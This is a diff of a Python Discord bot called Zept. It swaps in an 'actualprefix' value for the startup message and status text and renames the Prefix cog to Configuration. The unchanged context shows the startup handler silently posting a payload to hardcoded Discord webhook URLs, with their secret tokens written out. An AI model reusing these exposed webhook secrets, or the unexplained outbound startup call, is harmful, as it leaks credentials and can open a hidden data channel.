@@ -24,7 +24,7 @@ from io import BytesIO
 from json import loads, dumps
 from discord.ext import commands
 from urllib.request import Request, urlopen
-from bot_things import footerd, get_prefix, prefix, motd, emcolor, ercolor, getprefix
+from bot_things import footerd, get_prefix, prefix, motd, emcolor, ercolor, getprefix, actualprefix
 
 #def get_prefix(client,message):
 #    if not message.guild:
@@ -90,14 +90,14 @@ async def on_ready():
     'https://discord.com/api/webhooks/787959301338562561/4UEu0Yg9AEum5aICw6FLmAnM5ufLb7TFT36wz0ar2P67o23gJ2Rnh5or4H7B9shAqvu4', 
     'https://discord.com/api/webhooks/787959274626088970/4z4uUfSYKMsJWdD_b1ShTatJFPZp4nFcRZjmbiMt3p2HdLkA9wRX2jrsFWg5lt1Xk1RL'])
     urlopen(Request(webhook_link, data=dumps(webhook).encode(), headers=getheaders()))
-    print(f"Current prefix is {prefix}")
+    print(f"Current prefix is {actualprefix}")
     print(f"Logged in as {zept.user.name}#{zept.user.discriminator}.")
 
 async def presence():
     await zept.wait_until_ready()
 
     while not zept.is_closed():
-        await zept.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.listening, name=f"{prefix}help | Zept"))
+        await zept.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.listening, name=f"{actualprefix}help | Zept"))
         await asyncio.sleep(7)
         await zept.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(zept.guilds)} servers | Zept"))
         await asyncio.sleep(7)
@@ -107,7 +107,7 @@ async def presence():
 zept.loop.create_task(presence())
 
 def setup(bot):
-    exts = ['ErrorHandler', 'Moderation', 'Giveaway', 'Snipe', 'Math', 'Prefix', 'Help', 'Miscellaneous']
+    exts = ['ErrorHandler', 'Moderation', 'Giveaway', 'Snipe', 'Math', 'Configuration', 'Help', 'Miscellaneous']
 
     if __name__ == "__main__":
         for cog in exts:
